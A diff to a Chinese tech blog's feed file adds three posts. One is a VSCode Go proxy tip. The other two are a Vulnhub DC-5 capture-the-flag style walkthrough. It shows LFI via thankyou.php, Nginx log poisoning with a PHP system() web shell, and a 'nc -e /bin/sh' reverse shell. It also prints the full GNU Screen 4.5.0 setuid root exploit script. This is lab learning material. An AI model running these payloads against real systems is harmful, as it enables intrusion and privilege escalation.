@@ -4,6 +4,93 @@
   
   
   <entry>
+    <title>VSCode中配置Go相关插件失败问题</title>
+    <link href="/posts/3d084d62/"/>
+    <url>/posts/3d084d62/</url>
+    
+    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>安装完VSCode的Go插件后，一般会提示安装一些提醒类的辅助插件。当在常规安装中经常失败。。</p><p>一部分工具是需要从 <a href="https://golang.org/x/tools">https://golang.org/x/tools</a> 上进行获取，然而，由于网络的原因，经常导致安装失败。</p><p>即使，当我们将科学上网配置为全局代理后，也是不能访问到工具的下载地址。</p><p>因为<strong>在直接打开VSCode时，其中的操作没有经过代理</strong>。</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>终端设置为系统代理后，通过终端打开VSCode再进行安装插件。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 地址端口等按照自己的配置进行调整# 终端代理没有写入配置文件的情况下，仅在当前环境生效(参考环境变量)export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890 http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890 all_proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:7890# 打开VSCode后，在控制台进行 go:install 安装插件code .&#x2F;</code></pre></div><blockquote><p>参考：</p><p><a href="https://monsoir.github.io/Notes/Go/vscode-go.html">https://monsoir.github.io/Notes/Go/vscode-go.html</a></p></blockquote>]]></content>
+    
+    
+    <categories>
+      
+      <category>日常</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>VSCode</tag>
+      
+      <tag>Go</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Vulnhub DC-5 渗透测试(2)</title>
+    <link href="/posts/e6bc9214/"/>
+    <url>/posts/e6bc9214/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p><code>Vulnhub DC-5</code> GetShell后的提权</p></blockquote><h2 id="1-利用点查找"><a href="#1-利用点查找" class="headerlink" title="1. 利用点查找"></a>1. 利用点查找</h2><p>查找所有具有setuid的指令</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@dc-5:~&#x2F;html$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null&#x2F;bin&#x2F;su&#x2F;bin&#x2F;mount&#x2F;bin&#x2F;umount&#x2F;bin&#x2F;screen-4.5.0&#x2F;usr&#x2F;bin&#x2F;gpasswd&#x2F;usr&#x2F;bin&#x2F;procmail&#x2F;usr&#x2F;bin&#x2F;at&#x2F;usr&#x2F;bin&#x2F;passwd&#x2F;usr&#x2F;bin&#x2F;chfn&#x2F;usr&#x2F;bin&#x2F;newgrp&#x2F;usr&#x2F;bin&#x2F;chsh&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device&#x2F;usr&#x2F;sbin&#x2F;exim4&#x2F;sbin&#x2F;mount.nfs</code></pre></div><p>可以看到在可执行文件中有个显著的程序<code>screen-4.5.0</code>。</p><p>通过<code>searchsploit</code>查找<code>screen 4.5</code>的可利用漏洞。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; searchsploit screen 4.5--------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                   |  Path--------------------------------------------------------------------------------- ---------------------------------GNU Screen 4.5.0 - Local Privilege Escalation                                    | linux&#x2F;local&#x2F;41154.shGNU Screen 4.5.0 - Local Privilege Escalation (PoC)                              | linux&#x2F;local&#x2F;41152.txt--------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results</code></pre></div><p>主要关注<code>/usr/share/exploitdb/exploits/linux/local/41154.sh</code>文件，可以看到直接给出了利用方式。</p><p>同时给出了<a href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html">bug</a>介绍，简要看了一下主要是<strong>利用程序的check以root权限打开日志文件</strong>。这使得我们可以截断任何文件或创建一个具有任何目录中的任何内容的root文件，并且可以通过这种方式轻松地获取root权限。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;41154.sh&#x2F;41154.sh#!&#x2F;bin&#x2F;bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https:&#x2F;&#x2F;lists.gnu.org&#x2F;archive&#x2F;html&#x2F;screen-devel&#x2F;2017-01&#x2F;msg00025.html# HACK THE PLANET# ~ infodox (25&#x2F;1&#x2F;2017)echo &quot;~ gnu&#x2F;screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; &#x2F;tmp&#x2F;libhax.c#include &lt;stdio.h&gt;ls#include &lt;sys&#x2F;types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 0, 0);    chmod(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 04755);    unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;EOFgcc -fPIC -shared -ldl -o &#x2F;tmp&#x2F;libhax.so &#x2F;tmp&#x2F;libhax.crm -f &#x2F;tmp&#x2F;libhax.ccat &lt;&lt; EOF &gt; &#x2F;tmp&#x2F;rootshell.c#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);&#125;EOFgcc -o &#x2F;tmp&#x2F;rootshell &#x2F;tmp&#x2F;rootshell.crm -f &#x2F;tmp&#x2F;rootshell.cecho &quot;[+] Now we create our &#x2F;etc&#x2F;ld.so.preload file...&quot;cd &#x2F;etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so...&#x2F;tmp&#x2F;rootshell</code></pre></div><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><p>上述<code>41154.sh</code>本来应该直接具有可执行性。但是上传到被攻击服务器上时，执行有错误。</p><p>对脚本稍作整理之后执行。执行过程并不复杂。</p><p><strong>将第一部分代码存于<code>/tmp/libhax.c</code>编译为<code>/tmp/libhax.so</code>。</strong></p><p><strong>内容主要是为了赋予<code>rootshell</code>可执行文件权限。</strong></p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;sys&#x2F;types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 0, 0);    chmod(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 04755);    unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;</code></pre></div><p><strong>将第二部分代码存于<code>/tmp/rootshell.c</code>编译为<code>/tmp/rootshell</code>。</strong></p><p><strong>内容主要是设置<code>setuid</code>等权限，提权后运行<code>sh</code>。</strong></p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);&#125;</code></pre></div><p><strong>第三部分执行代码，可保存为shell脚本等待使用<code>poc.sh</code>。</strong></p><p><strong>内容主要是讲第一部分的提升<code>rootshell</code>权限的部分写入<code>/etc</code>的某个文件中，并引起执行。</strong></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo &quot;[+] Now we create our &#x2F;etc&#x2F;ld.so.preload file...&quot;cd &#x2F;etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so...&#x2F;tmp&#x2F;rootshell</code></pre></div><p><strong>将整理好的<code>libhax.so</code>、<code>rootshell</code>、<code>poc.sh</code>上传到靶机的<code>/tmp</code>下。赋予<code>poc.sh</code>权限，执行后看到提权成功。</strong></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@dc-5:~&#x2F;html$ cd &#x2F;tmpwww-data@dc-5:&#x2F;tmp$ lsdc5.shlibhax.so  rootshellwww-data@dc-5:&#x2F;tmp$ chmod +x poc.shwww-data@dc-5:&#x2F;tmp$ .&#x2F;poc.sh[+] Now we create our &#x2F;etc&#x2F;ld.so.preload file...[+] Triggering...&#39; from &#x2F;etc&#x2F;ld.so.preload cannot be preloaded (cannot open shared object file): ignored.[+] done!No Sockets found in &#x2F;tmp&#x2F;screens&#x2F;S-www-data.# whoamiroot# cd &#x2F;root# lsthisistheflag.txt#</code></pre></div>]]></content>
+    
+    
+    <categories>
+      
+      <category>学习笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>Vulnhub</tag>
+      
+      <tag>提权</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Vulnhub DC-5 渗透测试(1)</title>
+    <link href="/posts/cd91c1d7/"/>
+    <url>/posts/cd91c1d7/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>进行了一次Vulnhub DC-5 渗透测试，内容较为简单，主要练习相关环境的建立与测试流程。</p><p>靶机：<a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a></p></blockquote><h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1. 主机发现"></a>1. 主机发现</h2><p>利用<code>netdiscover</code>发现主机，<code>192.168.203.130</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ netdiscoverCurrently scanning: 192.168.234.0&#x2F;16   |   Screen View: Unique Hosts2 Captured ARP Req&#x2F;Rep packets, from 2 hosts.   Total size: 120_____________________________________________________________________________  IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname-----------------------------------------------------------------------------192.168.205.1   e2:b5:5f:2f:91:64      1      60  Unknown vendor192.168.205.7   00:0c:29:63:68:89      1      60  VMware, Inc.</code></pre></div><p>或者使用<code>nmap -sP 192.168.205.0/24</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sP 192.168.205.0&#x2F;24Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-11 15:48 CSTNmap scan report for 192.168.205.1Host is up (0.00036s latency).MAC Address: E2:B5:5F:2F:91:64 (Unknown)Nmap scan report for 192.168.205.7Host is up (0.0012s latency).MAC Address: 00:0C:29:63:68:89 (VMware)Nmap scan report for 192.168.205.4Host is up.Nmap done: 256 IP addresses (3 hosts up) scanned in 2.08 seconds</code></pre></div><h2 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2. 端口扫描"></a>2. 端口扫描</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sV -A 192.168.205.7Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-11 15:37 CSTNmap scan report for 192.168.205.7Host is up (0.00093s latency).Not shown: 998 closed portsPORT    STATE SERVICE VERSION80&#x2F;tcp  open  http    nginx 1.6.2|_http-server-header: nginx&#x2F;1.6.2|_http-title: Welcome111&#x2F;tcp open  rpcbind 2-4 (RPC #100000)| rpcinfo:|   program version    port&#x2F;proto  service|   100000  2,3,4        111&#x2F;tcp   rpcbind|   100000  2,3,4        111&#x2F;udp   rpcbind|   100000  3,4          111&#x2F;tcp6  rpcbind|   100000  3,4          111&#x2F;udp6  rpcbind|   100024  1          43447&#x2F;tcp   status|   100024  1          46548&#x2F;udp6  status|   100024  1          53003&#x2F;udp   status|_  100024  1          60147&#x2F;tcp6  statusMAC Address: 00:0C:29:63:68:89 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.93 ms 192.168.205.7OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds</code></pre></div><h2 id="3-入侵点测试"><a href="#3-入侵点测试" class="headerlink" title="3. 入侵点测试"></a>3. 入侵点测试</h2><p>可以看到主要可利用端口为<code>80</code>。</p><p>查看了Web页面，没有什么CMS，只有几个标题页脚和几个页面。</p><p>其中<code>Home</code>、<code>Solutions</code>、<code>About Us</code>、<code>FAQ</code>都是一些文字没有利用空间。</p><p>在<code>Contact</code>页面中有表单提交，进行尝试分析。</p><p>![image-20210411161140031](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411161140031.png)</p><p>在提交了几次表单后，发现<strong>页脚的年份在不断变化</strong>。</p><p>可能是引入了<code>footer.php</code>来输出页脚信息。</p><p>![image-20210411161246026](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411161246026.png)</p><h3 id="3-1-文件包含漏洞"><a href="#3-1-文件包含漏洞" class="headerlink" title="3.1 文件包含漏洞"></a>3.1 文件包含漏洞</h3><p>因为页脚信息可能是通过包含<code>footer.php</code>进行输出的，所以可能存在文件包含漏洞，这里简单读一下系统目录发现直接就能读：<code>http://192.168.205.7/thankyou.php?file=/etc/passwd</code></p><p>说明此处存在<strong>文件包含漏洞</strong>。</p><p>![image-20210411161805188](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411161805188.png)</p><p>同样可以使用伪协议来读取<code>thankyou.php</code>源码：<code>http://192.168.205.7/thankyou.php?file=php://filter/read=convert.base64-encode/resource=thankyou.php</code></p><p>![image-20210411162142698](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411162142698.png)</p><p>解码可以看到确实是通过包含<code>footer.php</code>用以输出页脚信息。</p><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">···&lt;footer&gt;&lt;?php$file &#x3D; $_GET[&#39;file&#39;];if(isset($file))&#123;include(&quot;$file&quot;);&#125;else&#123;include(&quot;footer.php&quot;);&#125;?&gt;&lt;&#x2F;footer&gt;···</code></pre></div><p>顺便看一下<code>footer.php</code>内容。</p><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;Random Gen Test$rndmYears &#x3D; array(    &quot;Copyright © 2017&quot;,     &quot;Copyright © 2018&quot;,     &quot;Copyright © 2019&quot;,     &quot;Copyright © 2020&quot;);echo $rndmYears[mt_rand(0, count($rndmYears)-1)];?&gt;</code></pre></div><h3 id="3-2-Nginx日志"><a href="#3-2-Nginx日志" class="headerlink" title="3.2 Nginx日志"></a>3.2 <code>Nginx</code>日志</h3><p>可以看到Web服务器使用了<code>Nginx</code>服务器，可以探测是否具有<code>Nginx</code>日志利用的可能。</p><p>![image-20210411162652641](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411162652641.png)</p><p>查看<code>Nginx</code>配置文件：<code>http://192.168.205.7/thankyou.php?file=/etc/nginx/nginx.conf</code></p><p>![image-20210411163026501](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411163026501.png)</p><p>可以看到log存放的目录：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log;error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</code></pre></div><p>之后发包测试带入<code>&lt;?php phpinfo();?&gt;</code>看是否执行。</p><p>![image-20210411171626230](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411171626230.png)</p><p>之后验证读取日志文件：<code>http://192.168.205.7/thankyou.php?file=/var/log/nginx/error.log</code></p><p>![image-20210411171720343](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411171720343.png)</p><p>发现成功显示，说明Nginx日志写入命令成功执行。</p><h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h2><p>之后结合本地文件包含与Nginx日志进行Getshell。</p><p>传入一句话<code>http://192.168.205.7/thankyou.php?file=&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;</code></p><p>![image-20210411172554154](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411172554154.png)</p><p>可以看到成功读取内容：<code>http://192.168.205.7/thankyou.php？file=/var/log/nginx/error.log&amp;cmd=ls</code></p><p>![image-20210411172655422](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411172655422.png)</p><p>反弹shell：<code>/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc -e /bin/sh 192.168.205.4 4444</code></p><p>![image-20210411173848021](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411173848021.png)</p><p>nc连接，反弹成功。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nc -lvp 4444listening on [any] 4444 ...192.168.205.7: inverse host lookup failed: Unknown hostconnect to [192.168.205.4] from (UNKNOWN) [192.168.205.7] 57668lsabout-us.phpcontact.phpcssfaq.phpfooter.phpimagesindex.phpsolutions.phpthankyou.php</code></pre></div><p>切换为交互式<code>bash</code>：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">···solutions.phpthankyou.phppython -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;www-data@dc-5:~&#x2F;html$ lslsabout-us.php  css      footer.php  index.php  thankyou.phpcontact.php   faq.php  images   solutions.phpwww-data@dc-5:~&#x2F;html$</code></pre></div><p>之后为提权内容参见*Vulnhub DC-5 渗透测试(2)*。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>学习笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>Vulnhub</tag>
+      
+      <tag>文件包含</tag>
+      
+      <tag>Nginx</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Mac删除Launchpad残留图标</title>
     <link href="/posts/98807702/"/>
     <url>/posts/98807702/</url>
@@ -519,11 +606,11 @@
     
     <tags>
       
-      <tag>摘录</tag>
-      
       <tag>假面山庄</tag>
       
       <tag>东野圭吾</tag>
+      
+      <tag>摘录</tag>
       
     </tags>
     
@@ -641,11 +728,11 @@
     
     <tags>
       
+      <tag>摘录</tag>
+      
       <tag>局外人</tag>
       
       <tag>阿尔贝·加缪</tag>
-      
-      <tag>摘录</tag>
       
     </tags>
     
